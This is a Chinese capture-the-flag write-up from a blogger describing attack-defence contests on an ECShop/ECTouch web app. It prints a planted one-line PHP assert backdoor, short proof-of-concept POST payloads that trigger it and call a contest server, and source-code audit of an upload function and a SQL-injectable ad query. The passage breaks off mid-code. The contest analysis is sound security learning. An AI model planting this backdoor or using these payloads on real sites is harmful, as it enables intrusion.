<!DOCTYPE html><html class="has-navbar-fixed-top" lang="zh-cmn-Hans"><head><meta charset="utf-8"><title>记几次攻防赛 - Zedd&#39;s Blog</title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="ZeddYu's Blog"><meta name="description" content="好久没发博客了…主要是比赛太多了…这几个月周末几乎无休，基本都是各种比赛 先慢慢来总结吧。"><meta property="og:type" content="article"><meta property="og:title" content="记几次攻防赛"><meta property="og:url" content="https://blog.zeddyu.info/2018/06/27/%E8%AE%B0%E5%87%A0%E6%AC%A1%E6%94%BB%E9%98%B2%E8%B5%9B/index.html"><meta property="og:site_name" content="Zedd&#39;s Blog"><meta property="og:description" content="好久没发博客了…主要是比赛太多了…这几个月周末几乎无休，基本都是各种比赛 先慢慢来总结吧。"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2018-06-27T19:28:00.000Z"><meta property="article:modified_time" content="2021-09-27T17:45:58.724Z"><meta property="article:author" content="Zedd"><meta property="article:tag" content="AWD"><meta name="twitter:card" content="summary"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.8.1/css/bulma.min.css"><script defer="defer" src="https://at.alicdn.com/t/font_1780077_0ad2sbnz4nz.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="/css/style.css"><script>window.ga_tid="UA-112937997-1",window.ga_api="https://blog.zeddyu.info/ga_api/*"</script><script src="https://cdn.jsdelivr.net/npm/cfga@1.0.3" async></script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Zedd's Blog" type="application/atom+xml"></head><body><nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation"><div class="container"><div class="navbar-brand"><div class="navbar-item navbar-logo"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://s.gravatar.com/avatar/204a0c779acdb62f9084826396f6dccb?s=80" alt="" height="28"></div><div class="navbar-burger"><span></span><span></span><span></span></div></div><div class="navbar-menu navbar-start"> <a class="navbar-item" href="/">Index</a> <a class="navbar-item" href="/archives">Archives</a> <a class="navbar-item" href="/categories">Categories</a> <a class="navbar-item" href="/tags">Tags</a> <a class="navbar-item" href="/friends">Friends</a> <a class="navbar-item" href="/about">About</a> <a class="navbar-item" href="/advertisement">Ads</a></div><div class="navbar-menu navbar-end"> <a class="navbar-item search" title="Search" href="javascript:;"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-sousuo"></use></svg></a><div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc"> <a class="navbar-item" title="Table of Contents"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-list"></use></svg></a><div class="navbar-dropdown is-right"> <a class="navbar-item" href="#“西湖论剑”杯线下AWD">1&nbsp;&nbsp;<b>“西湖论剑”杯线下AWD</b></a> <a class="navbar-item" href="#Poc-1">1.1&nbsp;&nbsp;Poc 1</a> <a class="navbar-item" href="#Poc-1-分析">1.2&nbsp;&nbsp;Poc 1 分析</a> <a class="navbar-item" href="#Poc-2">1.3&nbsp;&nbsp;Poc 2</a> <a class="navbar-item" href="#Poc-2-分析">1.4&nbsp;&nbsp;Poc 2 分析</a> <a class="navbar-item" href="#Poc-3">1.5&nbsp;&nbsp;Poc 3</a> <a class="navbar-item" href="#Something-Else">1.6&nbsp;&nbsp;Something Else</a><hr class="navbar-divider"> <a class="navbar-item" href="#第二届“红帽杯”线下攻防大赛">2&nbsp;&nbsp;<b>第二届“红帽杯”线下攻防大赛</b></a> <a class="navbar-item" href="#Web1">2.1&nbsp;&nbsp;Web1</a> <a class="navbar-item" href="#Poc-1-1">2.1.1&nbsp;&nbsp;Poc 1</a> <a class="navbar-item" href="#Poc-2-1">2.1.2&nbsp;&nbsp;Poc 2</a> <a class="navbar-item" href="#Poc-3-1">2.1.3&nbsp;&nbsp;Poc 3</a> <a class="navbar-item" href="#Poc-4">2.1.4&nbsp;&nbsp;Poc 4</a> <a class="navbar-item" href="#Eles">2.1.5&nbsp;&nbsp;Eles</a> <a class="navbar-item" href="#Web2">2.2&nbsp;&nbsp;Web2</a> <a class="navbar-item" href="#Poc-1-2">2.2.1&nbsp;&nbsp;Poc 1</a> <a class="navbar-item" href="#Poc-2-2">2.2.2&nbsp;&nbsp;Poc 2</a> <a class="navbar-item" href="#Poc-3-2">2.2.3&nbsp;&nbsp;Poc 3</a> <a class="navbar-item" href="#Poc-4-1">2.2.4&nbsp;&nbsp;Poc 4</a> <a class="navbar-item" href="#Poc-5">2.2.5&nbsp;&nbsp;Poc 5</a><hr class="navbar-divider"> <a class="navbar-item" href="#总结">3&nbsp;&nbsp;<b>总结</b></a></div></div> <a class="navbar-item" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-github"></use></svg></a> <a class="navbar-item" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-twitter"></use></svg></a> <a class="navbar-item" title="RSS" href="https://blog.zeddyu.info/atom.xml"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-rss"></use></svg></a></div></div></nav><section class="section"><div class="container"><article class="article content gallery" itemscope itemprop="blogPost"><h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name"> 记几次攻防赛</h1><div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile"> <span class="column is-narrow"><span>Jun 27 2018</span> <span class="second-date-block">(<time datetime="2018-06-27T19:28:00.000Z" itemprop="datePublished">Jun 27 2018</time>)</span></span> <span class="column is-narrow article-category"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-folder"></use></svg><a class="article-category-link" href="/categories/CTF/">CTF</a></span> <span class="column is-narrow"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-shalou"></use></svg> <span class="article-category-link">32 minutes read (About 4831 words)</span></span></div><div class="article-entry is-size-6-mobile" itemprop="articleBody"><ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#“西湖论剑”杯线下AWD"><span class="post-toc-number">1.</span> <span class="post-toc-text">“西湖论剑”杯线下AWD</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Poc-1"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">Poc 1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Poc-1-分析"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">Poc 1 分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Poc-2"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">Poc 2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Poc-2-分析"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">Poc 2 分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Poc-3"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">Poc 3</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Something-Else"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">Something Else</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#第二届“红帽杯”线下攻防大赛"><span class="post-toc-number">2.</span> <span class="post-toc-text">第二届“红帽杯”线下攻防大赛</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Web1"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">Web1</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Poc-1-1"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text">Poc 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Poc-2-1"><span class="post-toc-number">2.1.2.</span> <span class="post-toc-text">Poc 2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Poc-3-1"><span class="post-toc-number">2.1.3.</span> <span class="post-toc-text">Poc 3</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Poc-4"><span class="post-toc-number">2.1.4.</span> <span class="post-toc-text">Poc 4</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Eles"><span class="post-toc-number">2.1.5.</span> <span class="post-toc-text">Eles</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Web2"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">Web2</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Poc-1-2"><span class="post-toc-number">2.2.1.</span> <span class="post-toc-text">Poc 1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Poc-2-2"><span class="post-toc-number">2.2.2.</span> <span class="post-toc-text">Poc 2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Poc-3-2"><span class="post-toc-number">2.2.3.</span> <span class="post-toc-text">Poc 3</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Poc-4-1"><span class="post-toc-number">2.2.4.</span> <span class="post-toc-text">Poc 4</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Poc-5"><span class="post-toc-number">2.2.5.</span> <span class="post-toc-text">Poc 5</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#总结"><span class="post-toc-number">3.</span> <span class="post-toc-text">总结</span></a></li></ol><html><head></head><body><p>好久没发博客了…主要是比赛太多了…这几个月周末几乎无休，基本都是各种比赛</p><p>先慢慢来总结吧。</p><a id="more"></a><h2 id="“西湖论剑”杯线下AWD"><a href="#“西湖论剑”杯线下AWD" class="headerlink" title="“西湖论剑”杯线下AWD"></a>“西湖论剑”杯线下AWD</h2><p>前一个小时和平发育，基本没人打…也不知道为啥…</p><p>这次也是我第二次参加AWD，第一次是在大一暑假参加的XMan结营赛的攻防…那时候啥都不懂，基本就是靠队内大佬带飞，直接飞到了团队第六，也就帮帮大佬传传shell啥的，不过也对攻防赛有了一个大致的印象。</p><p>这次AWD参选审核还是比较水的…当时好多都不知道怎么打的都来参加了…我还以为是大佬云集，我会被打的电脑都开不了的那种2333…感觉大家都还差不多…身后那支队后来直接放弃了，聊起天来了…</p><p>赛后想想，一开始没人打真的挺奇怪的，因为给的洞非常明显</p><p>这里放一个一叶飘零大佬的<a href="http://skysec.top/2018/04/27/%E7%BA%BF%E4%B8%8BAD-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-ECShop-V2-7-3/" target="_blank" rel="noopener">赛时分析文章</a>吧，我觉得写得非常好的，还是多应该向大佬学习学习</p><h3 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc 1"></a>Poc 1</h3><p>首先在<code>mobile\themes\default\auction_list.dwt</code>中有一个很明显的一句话马</p><p><code>{:assert($_POST[1])}</code></p><p>这里要是谁发现的早，应该很快就可以打了…只是没人打…但是这也是赛中官方给了hint我们才发现的…</p><p>赛后用D盾扫了一遍啥洞都没发现…</p><p>后来的poc都是抄作业抄过来的…当时也是被打得挺惨的…还是抓log后来才知道怎么打…还是经验太少了</p><p>基本抄的还是这个点</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post方式</span><br><span class="line">文件url：http:<span class="hljs-comment">//10.50.33.2/mobile/index.php?m=default&amp;c=auction</span></span><br><span class="line">参数：<span class="hljs-number">1</span>=phpinfo()</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Poc-1-分析"><a href="#Poc-1-分析" class="headerlink" title="Poc 1 分析"></a>Poc 1 分析</h3><p>首先，先看<code>assert()</code>，参照<a href="http://php.net/manual/zh/function.assert.php" target="_blank" rel="noopener">php文档</a>。</p><blockquote><p>PHP 5</p><p>bool assert ( mixed $assertion [, string $description ] )</p><hr><p>PHP 7</p><p>bool assert ( mixed $assertion [, Throwable $exception ] )</p><p>如果 <code>assertion</code> 是字符串，它将会被 assert() 当做 PHP 代码来执行</p></blockquote><p>很经典的一个一句话马</p><p>再看为什么在<code>dwt</code>文件里面就可以</p><blockquote><p>dwt 文件是网页模板文件(Dreamweaver Template), 在创建网站的多个网页的时候，通常可以将网页的共同部分创建成为一个模板， 然后给多个网页调用， 以实现网页代码的重复利用· 制作模板的时候， 用户可以自定义的模板可编辑区域和非可编辑区域， 可编辑区域将在调用模板的网页中再次填充代码</p></blockquote><p>既然是个网页模版，而整个站都用的是<code>php</code>，模版里的字符串自然会被当作<code>php</code>来解析。所以这里一句话马可以被执行</p><h3 id="Poc-2"><a href="#Poc-2" class="headerlink" title="Poc 2"></a>Poc 2</h3><p>参照一叶飘零大佬的</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post方式</span><br><span class="line">文件url：http:<span class="hljs-comment">//10.50.%s.2/mobile/index.php</span></span><br><span class="line">参数：url=http:<span class="hljs-comment">//10.0.1.2?token=队伍token</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Poc-2-分析"><a href="#Poc-2-分析" class="headerlink" title="Poc 2 分析"></a>Poc 2 分析</h3><p>我们从<code>mobile/index.php</code>开始分析：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-comment">/* 访问控制 */</span></span><br><span class="line">    define(<span class="hljs-string">'IN_ECTOUCH'</span>, <span class="hljs-keyword">true</span>);</span><br><span class="line">    <span class="hljs-comment">/* 设置系统编码格式 */</span></span><br><span class="line">    header(<span class="hljs-string">"Content-Type:text/html;charset=utf-8"</span>);</span><br><span class="line">    <span class="hljs-comment">/* 设置系统编码格式 */</span></span><br><span class="line">    header(<span class="hljs-string">"Pragma: no-cache"</span>);</span><br><span class="line">    <span class="hljs-comment">/* 修复后退没有提交数据的问题 */</span></span><br><span class="line">    header(<span class="hljs-string">"Cache-control: private"</span>);</span><br><span class="line">    <span class="hljs-comment">/* 加载核心文件 */</span> </span><br><span class="line">    <span class="hljs-keyword">require</span> (<span class="hljs-string">'include/EcTouch.php'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>跟踪<code>require(...)</code>函数，看到<code>EcTouch.php</code></p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-comment">/* 访问控制 */</span></span><br><span class="line">    defined(<span class="hljs-string">'IN_ECTOUCH'</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">'Deny Access'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (version_compare(PHP_VERSION, <span class="hljs-string">'5.2.0'</span>, <span class="hljs-string">'&lt;'</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">'require PHP &gt; 5.2.0 !'</span>);</span><br><span class="line">    defined(<span class="hljs-string">'BASE_PATH'</span>) <span class="hljs-keyword">or</span> define(<span class="hljs-string">'BASE_PATH'</span>, dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">'/'</span>);</span><br><span class="line">    defined(<span class="hljs-string">'ROOT_PATH'</span>) <span class="hljs-keyword">or</span> define(<span class="hljs-string">'ROOT_PATH'</span>, realpath(dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">'/../'</span>) . <span class="hljs-string">'/'</span>);</span><br><span class="line">    defined(<span class="hljs-string">'APP_PATH'</span>) <span class="hljs-keyword">or</span> define(<span class="hljs-string">'APP_PATH'</span>, BASE_PATH . <span class="hljs-string">'apps/'</span>);</span><br><span class="line">    defined(<span class="hljs-string">'ADDONS_PATH'</span>) <span class="hljs-keyword">or</span> define(<span class="hljs-string">'ADDONS_PATH'</span>, ROOT_PATH . <span class="hljs-string">'plugins/'</span>);</span><br><span class="line">    defined(<span class="hljs-string">'DEFAULT_APP'</span>) <span class="hljs-keyword">or</span> define(<span class="hljs-string">'DEFAULT_APP'</span>, <span class="hljs-string">'default'</span>);</span><br><span class="line">    defined(<span class="hljs-string">'DEFAULT_CONTROLLER'</span>) <span class="hljs-keyword">or</span> define(<span class="hljs-string">'DEFAULT_CONTROLLER'</span>, <span class="hljs-string">'Index'</span>);</span><br><span class="line">    defined(<span class="hljs-string">'DEFAULT_ACTION'</span>) <span class="hljs-keyword">or</span> define(<span class="hljs-string">'DEFAULT_ACTION'</span>, <span class="hljs-string">'index'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>再来看<code>APP_PATH</code>这个路径<code>apps/</code>，下面会有三个文件夹</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">default</span><br><span class="line">install</span><br></pre></td></tr></tbody></table></figure><p></p><p>首先查看默认文件夹<code>default</code>，看到又有5个文件夹</p><p></p><figure class="highlight vim hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">common</span><br><span class="line"><span class="hljs-keyword">conf</span></span><br><span class="line">controller</span><br><span class="line"><span class="hljs-keyword">language</span></span><br><span class="line">model</span><br></pre></td></tr></tbody></table></figure><p></p><p>再按照顺序首先来看第一个<code>common</code>，发现两个php文件</p><p></p><figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-selector-tag">function</span><span class="hljs-selector-class">.php</span></span><br><span class="line"><span class="hljs-selector-tag">insert</span><span class="hljs-selector-class">.php</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>在<code>function.php</code>中有个上传的函数比较可疑</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span><span class="hljs-params">($upload, $type)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($upload[<span class="hljs-string">'tmp_name'</span>])) {</span><br><span class="line">        $ftype = check_file_type($upload[<span class="hljs-string">'tmp_name'</span>], $upload[<span class="hljs-string">'name'</span>], <span class="hljs-string">'|png|jpg|jpeg|gif|doc|xls|txt|zip|ppt|pdf|rar|docx|xlsx|pptx|'</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($ftype)) {</span><br><span class="line">            $name = date(<span class="hljs-string">'Ymd'</span>);</span><br><span class="line">            <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-number">6</span>; $i++) {</span><br><span class="line">                $name .= chr(mt_rand(<span class="hljs-number">97</span>, <span class="hljs-number">122</span>));</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            $name = $_SESSION[<span class="hljs-string">'user_id'</span>] . <span class="hljs-string">'_'</span> . $name . <span class="hljs-string">'.'</span> . $ftype;</span><br><span class="line"></span><br><span class="line">            $target = ROOT_PATH . DATA_DIR . <span class="hljs-string">'/'</span> . $type . <span class="hljs-string">'/'</span> . $name;</span><br><span class="line">            <span class="hljs-keyword">if</span> (!move_upload_file($upload[<span class="hljs-string">'tmp_name'</span>], $target)) {</span><br><span class="line">                ECTouch::err()-&gt;add(L(<span class="hljs-string">'upload_file_error'</span>), <span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">            } <span class="hljs-keyword">else</span> {</span><br><span class="line">                <span class="hljs-keyword">return</span> $name;</span><br><span class="line">            }</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            ECTouch::err()-&gt;add(L(<span class="hljs-string">'upload_file_type'</span>), <span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">        }</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        ECTouch::err()-&gt;add(L(<span class="hljs-string">'upload_file_error'</span>));</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>而且这个函数在留言板中被调用，是否能利用还有待研究，<code>function.php</code>中的其他函数基本没什么异常</p><p>再来看<code>insert.php</code>，可以发现有个<code>insert_ads()</code>函数：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_ads</span><span class="hljs-params">($arr)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">static</span> $static_res = <span class="hljs-keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($arr[<span class="hljs-string">'num'</span>]) &amp;&amp; $arr[<span class="hljs-string">'num'</span>] != <span class="hljs-number">1</span>) {</span><br><span class="line">        $sql = <span class="hljs-string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span> .</span><br><span class="line">                <span class="hljs-string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</span><br><span class="line">                <span class="hljs-string">'FROM '</span> . M()-&gt;pre . <span class="hljs-string">'touch_ad '</span> . <span class="hljs-string">' AS a '</span> .</span><br><span class="line">                <span class="hljs-string">'LEFT JOIN '</span> . M()-&gt;pre . <span class="hljs-string">'touch_ad_position '</span> . <span class="hljs-string">' AS p ON a.position_id = p.position_id '</span> .</span><br><span class="line">                <span class="hljs-string">"WHERE enabled = 1 AND start_time &lt;= '"</span> . $time . <span class="hljs-string">"' AND end_time &gt;= '"</span> . $time . <span class="hljs-string">"' "</span> .</span><br><span class="line">                <span class="hljs-string">"AND a.position_id = '"</span> . $arr[<span class="hljs-string">'id'</span>] . <span class="hljs-string">"' "</span> .</span><br><span class="line">                <span class="hljs-string">'ORDER BY rnd LIMIT '</span> . $arr[<span class="hljs-string">'num'</span>];</span><br><span class="line">        $res = M()-&gt;query($sql);</span><br><span class="line">  